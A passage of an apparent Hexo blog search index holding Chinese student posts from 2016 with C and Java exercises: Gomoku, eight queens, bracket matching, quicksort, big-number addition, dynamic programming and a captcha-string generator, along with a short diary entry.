if(a[row][j]!=flag) break; else sum++; if(sum==5) { printf(&quot;%cp%d success\\n&quot;,flag,flag); exit(1); } } } void testLeft(int i,int j,int flag) { int m,n,sum,row,col; for(m=i-4,n=j+4;m&lt;=i;m++,n--) { sum=0; if(isOut(m,n)==0) continue; for(row=m,col=n;sum&lt;=5;row++,col--) if(a[row][col]!=flag) break; else sum++; if(sum==5) { printf(&quot;%cp%d success\\n&quot;,flag,flag); exit(1); } } } void testLeftToRight(int i,int j,int flag) { int n,sum,col; for(n=j-4;n&lt;=j;n++) { sum=0; if(isOut(i,n)==0) continue; for(col=n;sum&lt;=5;col++) if(a[i][col]!=flag) break; else sum++; if(sum==5) { printf(&quot;%cp%d success\\n&quot;,flag,flag); exit(1); } } } void test(int i,int j,int flag)//对棋子时候5连测试 { if(a[i-1][j-1]==flag||a[i+1][j+1]==flag)//这是对右对角线的判断 testRight(i,j,flag); if(a[i-1][j]==flag||a[i+1][j]==flag)//这是对上下的判断 testUpToDown(i,j,flag); if(a[i-1][j+1]==flag||a[i+1][j-1]==flag)//这是对左对角线的判断 testLeft(i,j,flag); if(a[i][j-1]==flag||a[i][j+1]==flag)//这是对左右判断 testLeftToRight(i,j,flag); } int main()//本场比赛中，p1玩家用printf(&quot;%c &quot;,1);p2玩家用printf(&quot;%c &quot;,2); { //初始化棋盘 int total=0,flag;//total作为计算是否平局以及打印时通过%2，存入a数组中1和2，和打印在显示器上不同棋子 int i,j; memset(a,0,sizeof(a)/sizeof(int));//string类方法填充a数组 system(&quot;color 2f&quot;);//控制台颜色 print();//打印棋盘 while(1)//开始下棋 { if(total==100) { printf(&quot;Game Draw\\n&quot;);//平局 break; } printf(&quot;%cp%d please\\n&quot;,total%2+1,total%2+1); flag=total%2+1; scanf(&quot;%d%d&quot;,&amp;i,&amp;j); while(i&lt;0||i&gt;9||j&lt;0||j&gt;9||a[i][j]!=0) { printf(&quot;输入位置不合法,请重新输入\\n&quot;); scanf(&quot;%d%d&quot;,&amp;i,&amp;j); } a[i][j]=flag; system(&quot;cls&quot;); printf(&quot;%cp%d pre put at [%d] [%d]\\n&quot;,flag,flag,i,j);//打印之前一个人下的位置 print(); test(i,j,flag); total++; } return 0; }","categories":[],"tags":[{"name":"算法","slug":"算法","permalink":"http://yoursite.com/tags/%E7%AE%97%E6%B3%95/"},{"name":"五子棋","slug":"五子棋","permalink":"http://yoursite.com/tags/%E4%BA%94%E5%AD%90%E6%A3%8B/"}]},{"title":"八皇后","slug":"八皇后","date":"2016-09-11T06:36:29.000Z","updated":"2020-11-14T17:12:08.416Z","comments":true,"path":"2016/09/11/八皇后/","link":"","permalink":"http://yoursite.com/2016/09/11/%E5%85%AB%E7%9A%87%E5%90%8E/","excerpt":"","text":"终于写完了，听说有92种排序方式，看了不少博客，看到这句话，看别人代码百遍，不如自己写一遍，然后看别人代码，太简洁，没看懂，还是自己写 写了好久，终于成功了，记得加油，下面这个图很魔性，写卡了的时候，可以看看图，继续写 #include &lt;stdio.h&gt; int queen[9]; void print()//打印 { int i,j; for(i=1;i&lt;=8;i++) { for(j=1;j&lt;=8;j++) if(queen[i]==j) printf(&quot;%c &quot;,2);//打印这个地方，我是模仿别人的打印方式，打印出来，还是蛮不错的，蛮人性化的 else printf(&quot;. &quot;); printf(&quot;\\n&quot;); } } int check(int i)//判断时候合法 { int j; for(j=1;j&lt;i;j++) if(queen[j]==queen[i]||queen[j]-queen[i]==j-i||queen[j]-queen[i]==i-j) return 0; return 1; } int next(int i)//获得下一行合法位置 { int j; for(j=1;j&lt;=8;j++) { queen[i]=j; if(check(i)==1) { return j; } } return 0; } int replace(int i)//在当前行寻找除去queen[i]，也就是queen[i]+1~8之间的可选位置 { int j; if(queen[i]==8) return 0; for(j=queen[i]+1;j&lt;=8;j++) { queen[i]=j; if(check(i)==1) return i; } return 0; } void Try(int i,int value) { queen[i]=value; if(i==8) { print(); return; } /* int m,n; for(m=1;m&lt;=8;m++) { for(n=1;n&lt;=8;n++) if(queen[m]==n) printf(&quot;* &quot;); else printf(&quot;0 &quot;); printf(&quot;\\n&quot;); }*/ if(next(i+1)==0)//下一行没有合法位置 { while(replace(i)==0)//当前行也无合法位置，则继续循环上一个合理位置//感觉这个地方，是最后才想好的，感觉很重要 { i--; replace(i); } Try(i,queen[i]); } else//下一行存在合法位置 Try(i+1,next(i+1)); } int main() { int i; for(i=1;i&lt;=8;i++) queen[i]=0; Try(1,1); return 0; }这只是第一种，以后再更新92种 -—————————- 来个暴力的，虽然不好，但是他这种很轻便 void put(int n){int i;for(i=1;i&lt;MAX;i++){s[n]=i;if(check(n)){if(n==MAX-1)result();elseput(n+1);}}}","categories":[],"tags":[{"name":"算法","slug":"算法","permalink":"http://yoursite.com/tags/%E7%AE%97%E6%B3%95/"},{"name":"回溯","slug":"回溯","permalink":"http://yoursite.com/tags/%E5%9B%9E%E6%BA%AF/"}]},{"title":"nyoj4614括号匹配","slug":"nyoj4614括号匹配","date":"2016-09-07T04:13:18.000Z","updated":"2020-11-14T17:12:08.926Z","comments":true,"path":"2016/09/07/nyoj4614括号匹配/","link":"","permalink":"http://yoursite.com/2016/09/07/nyoj4614%E6%8B%AC%E5%8F%B7%E5%8C%B9%E9%85%8D/","excerpt":"","text":"import java.util.Scanner; import java.util.Stack; public class Main { public static void main(String[] args) { Scanner input=new Scanner(System.in); int testNum=input.nextInt(); out:while(testNum--!=0){ String str=input.next(); Stack&lt;Character&gt; stack=new Stack&lt;Character&gt;(); if(str.length()%2!=0||str.charAt(0)==&apos;]&apos;||str.charAt(0)==&apos;)&apos;){ System.out.println(&quot;No&quot;); continue out; } for(int i=0;i&lt;str.length();i++){ if(str.charAt(i)==&apos;(&apos;||str.charAt(i)==&apos;[&apos;) stack.push(str.charAt(i)); else if((stack.isEmpty())||!match(stack.pop(),str.charAt(i))){ System.out.println(&quot;No&quot;); continue out; } } System.out.println(&quot;Yes&quot;); } input.close(); } public static boolean match(Character ch1,char ch2){ return (ch1==&apos;(&apos;&amp;&amp;ch2==&apos;)&apos;)||(ch1==&apos;[&apos;&amp;&amp;ch2==&apos;]&apos;); } }这个是模仿别人的代码，下面新学会的 import java.util.Stack; out: continue out;//写的out，直接跳出到out处 Stack&lt;Character&gt; stack=new Stack&lt;Character&gt;(); input.close(); public static boolean match(Character ch1,char ch2){ return (ch1==&apos;(&apos;&amp;&amp;ch2==&apos;)&apos;)||(ch1==&apos;[&apos;&amp;&amp;ch2==&apos;]&apos;); }","categories":[],"tags":[{"name":"Java学习","slug":"Java学习","permalink":"http://yoursite.com/tags/Java%E5%AD%A6%E4%B9%A0/"}]},{"title":"验证码生成","slug":"验证码生成","date":"2016-09-06T11:53:25.000Z","updated":"2020-11-14T17:12:09.463Z","comments":true,"path":"2016/09/06/验证码生成/","link":"","permalink":"http://yoursite.com/2016/09/06/%E9%AA%8C%E8%AF%81%E7%A0%81%E7%94%9F%E6%88%90/","excerpt":"","text":"import java.util.Scanner; public class Main { public static void main(String[] args) { String randomCode=&quot;&quot;; System.out.println(&quot;请输入你生成几位验证码&quot;); Scanner input=new Scanner(System.in); int n=input.nextInt(); for(int i=0;i&lt;n;i++){ int random=(int)(Math.random()*3+1); if(random==1) randomCode=randomCode+getRandomLowerCaseLetter(); else if(random==2) randomCode=randomCode+getRandomUpperCaseLetter(); else randomCode=randomCode+getRandomDigitCharacter(); } System.out.println(randomCode); } public static char getRandomCharacter(char ch1,char ch2){ return (char)(ch1+Math.random()*(ch2-ch1+1)); } public static char getRandomLowerCaseLetter(){ return getRandomCharacter(&apos;a&apos;,&apos;z&apos;); } public static char getRandomUpperCaseLetter(){ return getRandomCharacter(&apos;A&apos;,&apos;Z&apos;); } public static char getRandomDigitCharacter(){ return getRandomCharacter(&apos;0&apos;,&apos;9&apos;); } }之前在视频上看过，当时第一次看见，感觉很奇妙，现在自己写起来，也还蛮有成就感的，这个代码，功能就是，你输入一个你想生成几位的验证码的个数，然后，输出几位验证码","categories":[],"tags":[{"name":"Java学习","slug":"Java学习","permalink":"http://yoursite.com/tags/Java%E5%AD%A6%E4%B9%A0/"}]},{"title":"nyoj4632吝啬的国度","slug":"nyoj4632吝啬的国度","date":"2016-09-06T09:13:20.000Z","updated":"2020-11-14T17:12:09.972Z","comments":true,"path":"2016/09/06/nyoj4632吝啬的国度/","link":"","permalink":"http://yoursite.com/2016/09/06/nyoj4632%E5%90%9D%E5%95%AC%E7%9A%84%E5%9B%BD%E5%BA%A6/","excerpt":"","text":"题目描述 在一个吝啬的国度里有N个城市，这N个城市间只有N-1条路把这个N个城市连接起来。现在，Tom在第S号城市，他有张该国地图，他想知道如果自己要去参观第T号城市，必须经过的前一个城市是几号城市（假设你不走重复的路）。 输入第一行输入一个整数M表示测试数据共有M(1&lt;=M&lt;=5)组每组测试数据的第一行输入一个正整数N(1&lt;=N&lt;=100000)和一个正整数S(1&lt;=S&lt;=100000)，N表示城市的总个数，S表示参观者所在城市的编号随后的N-1行，每行有两个正整数a,b(1&lt;=a,b&lt;=N)，表示第a号城市和第b号城市之间有一条路连通。 输出每组测试数据输N个正整数，其中，第i个数表示从S走到i号城市，必须要经过的上一个城市的编号。（其中i=S时，请输出-1）（每组一行，行末有空格） 样例输入110 11 91 88 1010 38 61 210 49 53 7 样例输出-1 1 10 10 9 8 3 1 1 8下面是自己写的，但是不是正版的，只是凭自己感觉写的dps，晚上在系统的认真学习一下dps改进前的代码（没过，总是超时） #include &lt;stdio.h&gt; #include &lt;string.h&gt; int city[10000][10000]; void dps(int toCity,int num,int myCity) { int i,j; for(i=1;i&lt;=num;i++) if(city[myCity][toCity]==1) { printf(&quot;%d &quot;,myCity); break; } else if(city[myCity][i]==1) { city[myCity][i]=2; city[i][myCity]=2; dps(toCity,num,i); } } int main() { int m; int num,myCity; int i,j,n; scanf(&quot;%d&quot;,&amp;m); while(m--) { scanf(&quot;%d%d&quot;,&amp;num,&amp;myCity); memset(city,0,num+1); int row,col; for(i=1;i&lt;num;i++) { scanf(&quot;%d%d&quot;,&amp;row,&amp;col); city[row][col]=1; city[col][row]=1; } for(i=1;i&lt;=num;i++) { if(i==myCity) { printf(&quot;-1 &quot;); continue; } else { for(n=1;n&lt;=num;n++) for(j=n;j&lt;=num;j++) if(city[n][j]==2) { city[n][j]=1; city[j][n]=1; } dps(i,num,myCity); } } } return 0; }感觉自己狗带了，还是没怎么过，写的，过不了","categories":[],"tags":[{"name":"ACM","slug":"ACM","permalink":"http://yoursite.com/tags/ACM/"}]},{"title":"统计单词","slug":"统计单词","date":"2016-09-04T05:03:12.000Z","updated":"2020-11-14T17:12:10.460Z","comments":true,"path":"2016/09/04/统计单词/","link":"","permalink":"http://yoursite.com/2016/09/04/%E7%BB%9F%E8%AE%A1%E5%8D%95%E8%AF%8D/","excerpt":"","text":"方法一：Scanner中方法hasNext() /* * 题目内容： 你的程序要读入一篇英文文章，然后统计其中的单词数来输出。需要统计的数据为： 总的单词数量； 含有1个字母到10个字母的单词的数量。 单词和单词的间隔是由各种空格（包括空格、tab和回车换行）形成的，也就是说，这里的单词与语言无关，可以包括各种符号，比如“it&apos;s”算一个单词，长度为4。注意，行中可能出现连续的空格。长度超过10个字母的单词需要计入总的单词数量，但是不做分类统计。 因此，对于下面的句子： &quot;What you see is a very hefty response,&quot; said CNN Aviation Correspondent Rene Marsh. 其中的单词共14个。注意这里的response,&quot;后面跟了空格。 输入格式: 一篇英文文章。 输出格式： 11个数字，依次是总的单词数量、1个字母的单词数量、2个字母的单词数量。。。10个字母的单词的数量。每个数字后有一个空格。行末有一个回车换行。 输入样例： &quot;What you see is a very hefty response,&quot; said CNN Aviation Correspondent Rene Marsh. 输出样例： 14 1 1 3 3 2 1 0 1 0 1 时间限制：500ms内存限制：32000kb*/ import java.util.Scanner; public class StatisticalWord {//统计单词个数 public static void main(String[] args) { Scanner input=new Scanner(System.in); int count=0; int[] counter=new int[11]; while(input.hasNext()){ String str=input.next(); if(str.length()&lt;=10&amp;&amp;str.length()&gt;=0){ counter[str.length()]++; } count++; } System.out.print(count); for(int i=1;i&lt;=10;i++) System.out.print(&quot; &quot;+counter[i]); System.out.println(); input.close(); } }本题是零基础学Java语言期末考试的编程题注意以下几点 it’s”算一个单词，长度为4 每个数字后有一个空格。行末有一个回车换行。 这里的response,”后面跟了空格 最后测试时，应该先将要测试的句子，ctrl+z粘贴到控制台上，然后enter，然后ctrl+z（此处是为了EOF） 方法二：String中方法split() split 方法：将一个字符串分割为子字符串，然后将结果作为字符串数组返回。 stringObj.split([separator]，[limit]) 参数：stringObj 必选项。要被分解的 String 对象或文字。该对象不会被 split 方法修改。 separator 可选项。字符串或 正则表达式 对象，它标识了分隔字符串时使用的是一个还是多个字符。如果忽 略该选项，返回包含整个字符串的单一元素数组。 limit可选项。该值用来限制返回数组中的元素个数。 说明：split 方法的结果是一个字符串数组，在 stingObj 中每个出现 separator 的位置都要进行分解。separator不作为任何数组元素的部分返回。 split 的实现直接调用的 matcher 类的 split 的方法。“ . ”在正则表达式中有特殊的含义，因此我们使用的时候必须进行转义”\\.” 如果用竖线“|”分隔的话，将出现不可得到的结果，必须改为“|” ，+ * 不是有效的模式匹配规则表达式，用”//*” “//+”转义后即可得到正确的结果。 import java.util.*; public class Main { public static void main(String a[]) { Scanner input=new Scanner(System.in); String Sentence=input.nextLine(); count(Sentence); } public static void count(String str){ int count=0; String string=str; int a[]=new int[11]; String s[]=string.split(&quot; &quot;); for(int i=0;i&lt;s.length;i++) if(s[i].length()&lt;=10&amp;&amp;s[i].length()&gt;=0) a[s[i].length()]++; System.out.print(s.length); for(int i=1;i&lt;=10;i++) System.out.print(&quot; &quot;+a[i]); System.out.println(); } }","categories":[],"tags":[{"name":"Java学习","slug":"Java学习","permalink":"http://yoursite.com/tags/Java%E5%AD%A6%E4%B9%A0/"},{"name":"java","slug":"java","permalink":"http://yoursite.com/tags/java/"}]},{"title":"开学记","slug":"开学记","date":"2016-09-02T14:34:27.000Z","updated":"2020-11-14T17:12:10.977Z","comments":true,"path":"2016/09/02/开学记/","link":"","permalink":"http://yoursite.com/2016/09/02/%E5%BC%80%E5%AD%A6%E8%AE%B0/","excerpt":"","text":"2016.09.02开学几天了，课程索然无味，一直没碰代码，主要是本能的害怕；暑假，学车，没过；4级竟然过了，也不错了；大部分时间，花在了游戏和娱乐上；我在想啊，人不能太专注学习，要懂点生活的情趣；现在在看诛仙，看完再学习，无法学习，沉迷小说；美妈：这个世界值得我们为之奋斗！","categories":[],"tags":[{"name":"生活","slug":"生活","permalink":"http://yoursite.com/tags/%E7%94%9F%E6%B4%BB/"}]},{"title":"nyoj 915 +-字符串","slug":"nyoj 915 +-字符串","date":"2016-07-29T02:46:43.000Z","updated":"2020-11-14T17:12:11.842Z","comments":true,"path":"2016/07/29/nyoj 915 +-字符串/","link":"","permalink":"http://yoursite.com/2016/07/29/nyoj%20915%20+-%E5%AD%97%E7%AC%A6%E4%B8%B2/","excerpt":"","text":"题目描述Shiva得到了两个只有加号和减号的字符串，字串长度相同。Shiva一次可以把一个加号和它相邻的减号交换。他想知道最少需要多少次操作才能把第一个字符串变换成第二个字符串。你现在要去帮助他完成那个这个问题。 输入多组测试数据 每组数据有两行，每行包含一个由”+”和”-“最成的字符串。每个子符串长度不超过5000。 输出仅一个整数，输出最少需要操作的次数。如果答案不存在，输出-1。 样例输入++-+--+ -++--++ 样例输出4 思路：大循环，通过遍历str1，比较str2， 1.str1[i]==str2[i],向后遍历 2.str1[i]!=str2[i],通过j=i+1遍历str2,分为两种firststr1[i]==str2[j],将str2[j]=str2[i];赋值即可 secondj=len,不满足，没有找到str1[i]这个字符，count=-1，break； #include &lt;stdio.h&gt; #include &lt;string.h&gt; int main() { char str1[5001],str2[5001],temp; int len,i,j,k,count; while(scanf(&quot;%s%s&quot;,str1,str2)!=EOF) { count=0; len=strlen(str1); for(i=0;i&lt;len;i++) { if(str1[i]!=str2[i]) { for(j=i+1;j&lt;len;j++) if(str1[i]==str2[j]) { break; } if(j==len) { count=-1; break; } count+=(j-i); str2[j]=str2[i]; } } printf(&quot;%d\\n&quot;,count); } return 0; }","categories":[],"tags":[]},{"title":"快速排序","slug":"快速排序","date":"2016-06-30T11:04:55.000Z","updated":"2020-11-14T17:12:16.839Z","comments":true,"path":"2016/06/30/快速排序/","link":"","permalink":"http://yoursite.com/2016/06/30/%E5%BF%AB%E9%80%9F%E6%8E%92%E5%BA%8F/","excerpt":"","text":"快速排序：采用分治思想1.分治思想：分治算法的基本思想是将一个规模为N的问题分解为K个规模较小的子问题，这些子问题相互独立且与原问题性质相同。求出子问题的解，就可得到原问题的解。即一种分目标完成程序算法，简单问题可用二分法完成。 我们现在对“6 1 2 7 9 3 4 5 10 8”这个10个数进行排序方法其实很简单：分别从初始序列“6 1 2 7 9 3 4 5 108”两端开始“探测”。先从右往左找一个小于6的数，再从左往右找一个大于6的数，然后交换他们。这里可以用两个变量i和j，分别指向序列最左边和最右边。我们为这两个变量起个好听的名字“哨兵i”和“哨兵j”。刚开始的时候让哨兵i指向序列的最左边（即i=1），指向数字6。让哨兵j指向序列的最右边（即j=10），指向数字8。 首先哨兵j开始出动。因为此处设置的基准数是最左边的数，所以需要让哨兵j先出动，这一点非常重要（请自己想一想为什么）。哨兵j一步一步地向左挪动（即j--），直到找到一个小于6的数停下来。接下来哨兵i再一步一步向右挪动（即i++），直到找到一个数大于6的数停下来。最后哨兵j停在了数字5面前，哨兵i停在了数字7面前。 现在交换哨兵i和哨兵j所指向的元素的值。交换之后的序列如下。 6 1 2 5 9 3 4 7 10 8 到此，第一次交换结束。接下来开始哨兵j继续向左挪动（再友情提醒，每次必须是哨兵j先出发）。他发现了4（比基准数6要小，满足要求）之后停了下来。哨兵i也继续向右挪动的，他发现了9（比基准数6要大，满足要求）之后停了下来。此时再次进行交换，交换之后的序列如下。 6 1 2 5 4 3 9 7 10 8 第二次交换结束，“探测”继续。哨兵j继续向左挪动，他发现了3（比基准数6要小，满足要求）之后又停了下来。哨兵i继续向右移动，糟啦！此时哨兵i和哨兵j相遇了，哨兵i和哨兵j都走到3面前。说明此时“探测”结束。我们将基准数6和3进行交换。交换之后的序列如下。3 1 2 5 4 6 9 7 10 8 、到此第一轮“探测”真正结束。此时以基准数6为分界点，6左边的数都小于等于6，6右边的数都大于等于6。回顾一下刚才的过程，其实哨兵j的使命就是要找小于基准数的数，而哨兵i的使命就是要找大于基准数的数，直到i和j碰头为止。 OK，解释完毕。现在基准数6已经归位，它正好处在序列的第6位。此时我们已经将原来的序列，以6为分界点拆分成了两个序列，左边的序列是“3 1 2 5 4”，右边的序列是“9 7 10 8”。接下来还需要分别处理这两个序列。因为6左边和右边的序列目前都还是很混乱的。不过不要紧，我们已经掌握了方法，接下来只要模拟刚才的方法分别处理6左边和右边的序列即可。现在先来处理6左边的序列现吧。 左边的序列是“3 1 2 5 4”。请将这个序列以3为基准数进行调整，使得3左边的数都小于等于3，3右边的数都大于等于3。好了开始动笔吧。 如果你模拟的没有错，调整完毕之后的序列的顺序应该是。 2 1 3 5 4 OK，现在3已经归位。接下来需要处理3左边的序列“2 1”和右边的序列“5 4”。对序列“2 1”以2为基准数进行调整，处理完毕之后的序列为“1 2”，到此2已经归位。序列“1”只有一个数，也不需要进行任何处理。至此我们对序列“2 1”已全部处理完毕，得到序列是“1 2”。序列“5 4”的处理也仿照此方法，最后得到的序列如下。 1 2 3 4 5 6 9 7 10 8 对于序列“9 7 10 8”也模拟刚才的过程，直到不可拆分出新的子序列为止。最终将会得到这样的序列，如下。 1 2 3 4 5 6 7 8 9 10 到此，排序完全结束。细心的同学可能已经发现，快速排序的每一轮处理其实就是将这一轮的基准数归位，直到所有的数都归位为止，排序就结束了。下面上个霸气的图来描述下整个算法的处理过程。 以上转自 [ http://ahalei.blog.51cto.com/4767671/1365285](http://ahalei.blog.51cto.com/4767671/1365285) 写的非常好 3.关于快速排序法为什么一定要从右边开始的原因 while(a[i]&lt;a[left]&amp;&amp;i&lt;j) i++; while(a[j]&gt;a[left]&amp;&amp;i&lt;j) j--;这里两个while的顺序是不能改变的，想一想：假设对如下进行排序：如上图，6在左，9在右 我们将6作为基数。假设从左边开始（与正确程序正好相反）于是i 就会移动到现在的 数字 7 那个位置停下来，而 j 原来在 数字 9 那个位置 ，因为 while(arr[j]&gt;=temp&amp;&amp;i&lt;j) 于是，j 也会停留在数字7 那个位置，于是问题来了。当你最后交换基数6与7时，不对呀！！。 问题在于当我们先从在边开始时，那么 i 所停留的那个位置肯定是大于基数6的，而在上述例子中，为了满足 i&lt;j 于是 j也停留在7的位置但最后交换回去的时候，7就到了左边，不行，因为我们原本交换后数字6在边应该是全部小于6，右边全部大于6.但现在不行了。于是，我们必须从右边开始，也就是从基数的对面开始。 转自 http://blog.csdn.net/w282529350/article/details/50982650 东拼西凑抄好的，下面自己模仿别人的快速排序这里写代码片 #include &lt;stdio.h&gt; void QuickSort(int a[],int left,int right) { int i=left+1,j=right,temp,; if(left&gt;=right) return; while(i!=j) { while(a[j]&gt;a[left]&amp;&amp;i&lt;j) j--; while(a[i]&lt;a[left]&amp;&amp;i&lt;j) i++; if(i&lt;j) { temp=a[i];a[i]=a[j];a[j]=temp; } } temp=a[left];a[left]=a[j];a[j]=temp; QuickSort(a,left,i-1); QuickSort(a,i+1,right); } int main() { int a[]={6,1,2,7,9,3,4,5,10,8},i; QuickSort(a,0,sizeof(a)/sizeof(int)-1); for(i=0;i&lt;10;i++) printf(&quot;%d\\t&quot;,a[i]); return 0; }markdown编辑好不舒服","categories":[],"tags":[{"name":"算法","slug":"算法","permalink":"http://yoursite.com/tags/%E7%AE%97%E6%B3%95/"},{"name":"快速排序","slug":"快速排序","permalink":"http://yoursite.com/tags/%E5%BF%AB%E9%80%9F%E6%8E%92%E5%BA%8F/"},{"name":"分治算法","slug":"分治算法","permalink":"http://yoursite.com/tags/%E5%88%86%E6%B2%BB%E7%AE%97%E6%B3%95/"},{"name":"排序","slug":"排序","permalink":"http://yoursite.com/tags/%E6%8E%92%E5%BA%8F/"}]},{"title":"A + B Problem II（高精度加法）","slug":"A + B Problem II（高精度加法）","date":"2016-06-24T10:02:16.000Z","updated":"2020-11-14T17:12:17.445Z","comments":true,"path":"2016/06/24/A + B Problem II（高精度加法）/","link":"","permalink":"http://yoursite.com/2016/06/24/A%20+%20B%20Problem%20II%EF%BC%88%E9%AB%98%E7%B2%BE%E5%BA%A6%E5%8A%A0%E6%B3%95%EF%BC%89/","excerpt":"","text":"#include &lt;stdio.h&gt; #include &lt;string.h&gt; int main() { int lenmax,la,lb,k,i,n,len,lenmin,l=1; char a[1000]; char b[1000]; char sum[1000]; char ch; scanf(&quot;%d&quot;,&amp;n); getchar(); while(n--) { scanf(&quot;%s&quot;,&amp;a); scanf(&quot;%s&quot;,&amp;b);//输入a和b//奥注意输入时y la=strlen(a)-1; lb=strlen(b)-1; lenmax=(la&gt;lb?la:lb); lenmin=(la&lt;lb)?la:lb; for(i=0;i&lt;=lenmax+1;i++)//将0位置留出来，防止越位，一共len+1位 sum[i]=&apos;0&apos;; //开始计算 //计算分2类,一类la==lb,二类la&gt;lb或la&lt;lb for(i=lenmax+1;lenmin!=-1;i--)//写相同的部分，从后往前，要防止进位 { if(sum[i]+a[la]+b[lb]&gt;=154)//154是三个数加起来等于10时的ascll的和，如1+4+5=49+52+53=154 { sum[i]=sum[i]+a[la--]+b[lb--]-106;//106是通过1+9+1-10=1=49=（49+57+49）-106 sum[i-1]=&apos;1&apos;; } else { sum[i]=a[la--]+b[lb--]+sum[i]-96; } lenmin--; } /*以上为两个数字相同的末位，下面开始讨论如果有剩余*/ if(la&lt;0) { for(k=i;k&gt;=1;k--) { if(sum[k]+b[lb]&gt;=106) { sum[k]=sum[k]+b[lb--]-58;//1+9=10=49+57-58=48 sum[k-1]=&apos;1&apos;; } else { sum[k]=b[lb--]+sum[k]-48;//1+0-x=1=49+48-48=49 } } } else { for(k=i;k&gt;=1;k--) { if(sum[k]+a[la]&gt;=106) { sum[k]=sum[k]+a[la--]-58;//1+9=10=49+57-58=48 sum[k-1]=&apos;1&apos;; } else { sum[k]=a[la--]+sum[k]-48; } } } //打印sum数组 printf(&quot;Case %d:\\n%s + %s = &quot;,l,a,b); if(sum[0]&gt;&apos;0&apos;&amp;&amp;sum[0]&lt;=&apos;9&apos;) { printf(&quot;%c&quot;,sum[0]); } for(k=1;k&lt;=lenmax+1;k++) printf(&quot;%c&quot;,sum[k]); printf(&quot;\\n&quot;); l++; if(n)printf(&quot;\\n&quot;); } return 0; }做了，好久，昨天晚上8.00钟写，写到9.30，刮大风，下雨了，我打着雨伞，走在雨中。我们这边，旁边的城市，刮起了龙卷风，还下了冰雹，死了98人，伤是500多人，厄尔尼诺现象，室友说这和七月下雪，是一样的； 然后，今天从上午，10.00左右，写，写了一遍，然后出错，调了好久，一直是错，干脆，就睡了一觉，重新写了一遍，吃饭去java import java.util.Scanner; import java.math.BigInteger; public class Main { public static void main(String []args){ BigInteger a,b; int T; Scanner input=new Scanner(System.in); T=input.nextInt(); for(int i=1;i&lt;=T;i++){ a=input.nextBigInteger(); b=input.nextBigInteger(); System.out.println(&quot;Case&quot;+&quot; &quot;+i+&quot;:&quot;); System.out.println(a+&quot; + &quot;+b+&quot; = &quot;+a.add(b)); } } }","categories":[],"tags":[{"name":"ACM","slug":"ACM","permalink":"http://yoursite.com/tags/ACM/"}]},{"title":"单调递增最长子序列-第一个dp（动态规划）","slug":"单调递增最长子序列-第一个dp（动态规划）","date":"2016-06-21T03:37:55.000Z","updated":"2020-11-14T17:12:18.137Z","comments":true,"path":"2016/06/21/单调递增最长子序列-第一个dp（动态规划）/","link":"","permalink":"http://yoursite.com/2016/06/21/%E5%8D%95%E8%B0%83%E9%80%92%E5%A2%9E%E6%9C%80%E9%95%BF%E5%AD%90%E5%BA%8F%E5%88%97-%E7%AC%AC%E4%B8%80%E4%B8%AAdp%EF%BC%88%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%EF%BC%89/","excerpt":"","text":"也许你和我一样，刚接触动态规划，一头雾水，看也看不懂，但作为过来人，写下一点东西，一方面，增加自己的记忆，另一方面，给你们点干货。dp（dynamicprogramming）；1. 动态规划，就是把计算过程中产生的中间结果静态地保存起来，后面再用到这些中间结果的时候就不用再算一遍，而是直接读取。2. 动态规划是递归，是缓存，是 用空间来换取时间 。3. 原问题的解如何由子问题的解组合而成。 **一个正常的思维过程应该是：1.OK 这个问题需要用到递归的思想….2.开始写递归…3.哇 算对了..4. 诶？怎么感觉有很多sub problem被重复计算了 干 复杂度到了 2^N5. 好吧 dp一下 弄个table或者是tree来memoization一下…6. 优化成功(当然如果你搞竞赛以上过程不适合你 如果你只是纯粹觉得理解dp是一件有趣的事情或者对算法抱有纯粹的兴趣 那么我觉得以上的过程很适合你) 作者：Pusheen Cherish链接： http://www.zhihu.com/question/23995189/answer/36008790 来源：知乎著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。**如果你们先详细了解，入门动态规划，那就看看知乎这个页面 http://www.zhihu.com/question/23995189 下面贴代码 #include &lt;stdio.h&gt; #include &lt;string.h&gt; char a[10001]; int dp[10000]; int f(int len) { int i,j,ans,m;//ans是这个字符串中最长子序列的值 dp[0]=1,ans=1;//如果这个字符串存在，那就存在dp[0],ans[1]; for(i=1;i&lt;len;i++)//遍历数组 { m=0;//如果a[i]比前面的所有都小，dp[i]=1; for(j=0;j&lt;i;j++)//获得从i=0,到i=i之间a[i]可以连续递增的值 { if(dp[j]&gt;m&amp;&amp;a[j]&lt;a[i]) m=dp[j]; } dp[i]=m+1;//找到那个i之前的最大值,并加1 if(dp[i]&gt;ans)//不断获得最大值 ans=dp[i]; } return ans; } int main() { int n,len; scanf(&quot;%d&quot;,&amp;n); while(n--) { scanf(&quot;%s&quot;,&amp;a); len=strlen(a); printf(&quot;%d\\n&quot;,f(len)); } return 0; }很多东西，都是接力下去的，写博客，就是一种接力，dp也是一种接力，后辈，好好加油，我也加油 重点研究几类经典问题在理解了动态规划的一些概念之后，要能做到用动态规划解题，其中重点研究几类经典问题是很有必要的。就近几年的比赛题目而言，往往都可以转化为我们已知的经典模型。下面介绍几个经典模型：1、按状态类型分编号（长度）动态规划类，题库：最长不下降子序列；拦截导弹（noip99）；花店橱窗布置（ioi99）。区间动态规划类，题库：石子合并；邮局（ioi2000）。坐标动态规划类，题库：棋盘分割（noi99）。数轴动态规划类，题库：01背包；装箱问题（noip01）。树型动态规划类，题库：选课（ctsc97），贪食的九头龙（noi02）。集合动态规划（状态压缩）类，题库：购物（ioi95）。2、按转移方式分存在性：01统计（ctsc99）；Catalan数划分问题：分割点有序类，题库：成绩最大（noip00）分割点无序类，题库：石子合并（noi95）；加分二叉树（noip03）；括号序列3、路径问题：方格取数（noip00）；花店橱窗布置（ioi99）通过这些经典模型的研究，可以从多角度了解如何进行状态的划分，然后反复理解每一个转移方程的意义，在潜移默化之中，我们便可以达到动态规划的基本要求，做到以不变应万变。","categories":[],"tags":[{"name":"动态规划","slug":"动态规划","permalink":"http://yoursite.com/tags/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"},{"name":"递归","slug":"递归","permalink":"http://yoursite.com/tags/%E9%80%92%E5%BD%92/"},{"name":"dp","slug":"dp","permalink":"http://yoursite.com/tags/dp/"}]},{"title":"杨辉三角队列方式","slug":"杨辉三角队列方式","date":"2016-06-14T11:34:25.000Z","updated":"2020-11-14T17:12:18.665Z","comments":true,"path":"2016/06/14/杨辉三角队列方式/","link":"","permalink":"http://yoursite.com/2016/06/14/%E6%9D%A8%E8%BE%89%E4%B8%89%E8%A7%92%E9%98%9F%E5%88%97%E6%96%B9%E5%BC%8F/","excerpt":"","text":"